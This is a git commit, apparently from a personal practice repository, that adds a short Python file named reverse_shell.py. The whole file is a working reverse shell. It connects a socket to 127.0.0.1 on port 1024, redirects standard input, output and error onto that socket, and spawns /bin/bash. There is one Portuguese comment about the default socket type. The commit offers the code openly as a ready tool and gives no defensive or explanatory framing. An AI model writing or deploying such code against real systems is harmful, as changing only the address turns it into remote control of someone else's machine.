8becd72832927fec6b0ce30f4c173f3053a1b471
Izzy <izzy.x0x00x@gmail.com>
2021-05-07 12:53:57 -0500

    reverse_shell

---
+++ reverse_shell.py
@@ -0,0 +1,11 @@
+import socket,os,pty
+
+s = socket.socket()
+# se nao colocar nada ele cria um socket padrão do tipo TCP/IP
+s.connect(("127.0.0.1", 1024))
+
+for fd in (0,1,2):
+    os.dup2(s.fileno(),fd)
+    
+pty.spawn('/bin/bash')
+
